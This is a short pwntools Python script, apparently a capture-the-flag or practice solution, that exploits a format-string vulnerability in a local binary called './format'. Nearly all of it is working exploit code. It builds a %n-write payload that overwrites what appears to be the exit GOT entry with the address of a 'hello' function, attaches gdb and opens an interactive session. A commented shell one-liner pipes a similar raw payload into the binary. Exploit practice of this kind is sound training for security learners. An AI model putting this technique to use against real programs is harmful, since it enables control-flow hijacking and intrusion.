from pwn import *

BIN = "./format"
DEBUG = 1

exit = 0x804c01c
exit1 = exit + 0x2
hello = 0x080491a2


def exploit():

  payload = p32(exit) + p32(exit1) + b"%37274d%4$08n" + b"%30306d%5$08n"
  _breakpoint = """
      b *0x080491fd
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()




# echo `python2 -c "print '\x1c\xc0\x04\x08\x1e\xc0\x04\x08' + "%4\$hn%5$\n"'` | ./format 